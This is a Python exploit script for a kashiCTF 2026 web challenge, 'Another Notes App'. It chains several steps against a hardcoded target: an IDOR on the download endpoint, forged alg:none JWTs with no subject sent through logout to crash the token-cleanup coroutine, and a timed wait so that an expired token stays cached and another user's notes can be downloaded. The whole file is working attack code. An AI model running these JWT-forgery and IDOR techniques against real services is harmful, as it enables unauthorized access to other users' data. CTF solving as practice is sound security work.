#!/usr/bin/env python3
"""Another Notes App - kashiCTF 2026 - Token cache crash + IDOR exploit"""
import requests
import base64
import json
import time
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://34.126.223.46:17831"
s = requests.Session()

# 1. Register and login
print("[1] Registering user...")
user = f"exploit_{int(time.time())}"
r = s.post(f"{BASE}/register", data={"username": user, "password": "pass123"}, allow_redirects=False)
print(f"    Register: {r.status_code}")

# Get token from session cookie
token = s.cookies.get("SESSION")
if not token:
    # Follow redirect and check
    r = s.get(f"{BASE}/notes")
    token = s.cookies.get("SESSION")
print(f"    Token: {token[:50]}..." if token else "    NO TOKEN!")

if not token:
    print("FAILED to get token")
    sys.exit(1)

# 2. Request download for "owner" (IDOR - username from POST param, not JWT)
print("[2] Requesting download for 'owner'...")
r = s.post(f"{BASE}/notes/request-download", data={"username": "owner"})
print(f"    Response: {r.text[:100]}")

# 3. Crash the cleanup coroutine
# Send forged alg:none JWTs through logout to trigger NPE in processLogoutInline
# parseWithoutValidation strips signature and parses as unsigned JWT
# If subject is missing/null, getUsername() returns null as non-nullable String -> NPE
# processLogoutInline has NO try-catch -> coroutine crashes -> no more cleanup
print("[3] Crashing cleanup coroutine...")

# Create a forged JWT with no subject (alg:none)
header = base64.urlsafe_b64encode(json.dumps({"alg": "none"}).encode()).rstrip(b'=').decode()
# Payload with NO subject field -> claims.subject returns null -> NPE in getUsername
payload = base64.urlsafe_b64encode(json.dumps({
    "iat": int(time.time()),
    "exp": int(time.time()) + 9999
}).encode()).rstrip(b'=').decode()
forged_jwt = f"{header}.{payload}.fakesig"

print(f"    Forged JWT: {forged_jwt[:60]}...")

# Send multiple logouts with the forged token to ensure it hits the channel
# We need to set the SESSION cookie to our forged JWT for the logout endpoint
for i in range(15):
    # Logout sends session.token through processLogout -> logoutChannel -> processLogoutInline
    logout_session = requests.Session()
    logout_session.cookies.set("SESSION", forged_jwt)
    r = logout_session.post(f"{BASE}/logout", allow_redirects=False)
    if i == 0:
        print(f"    Logout response: {r.status_code}")

print("    Sent 15 forged logout requests")

# 4. Wait for the cleanup coroutine to process and crash, then wait for download
# The download permission grants access after 300 seconds (5 min)
# But JWT expires after 180 seconds (3 min)
# If cleanup coroutine is dead, expired token stays in cache
print("[4] Waiting for download permission (5 min)...")
print(f"    Started at: {time.strftime('%H:%M:%S')}")

# Check periodically
for i in range(65):  # ~5.5 min in 5-sec intervals
    time.sleep(5)
    elapsed = (i + 1) * 5
    if elapsed % 30 == 0:
        print(f"    {elapsed}s elapsed...")

    if elapsed >= 295:  # Try after ~5 min
        print(f"[5] Trying download at {elapsed}s...")
        r = s.post(f"{BASE}/notes/request-download", data={"username": "owner"})
        print(f"    Status: {r.status_code}")
        print(f"    Response: {r.text[:500]}")
        if "kashiCTF" in r.text or "Something something" in r.text:
            print(f"\n[FLAG] {r.text}")
            # Save flag
            with open("/root/ctf/kashictf2026/web/another-notes-app/flag.txt", "w") as f:
                f.write(r.text + "\n")
            sys.exit(0)

print("\nDownload attempt after full wait...")
r = s.post(f"{BASE}/notes/request-download", data={"username": "owner"})
print(f"Status: {r.status_code}")
print(f"Response: {r.text}")
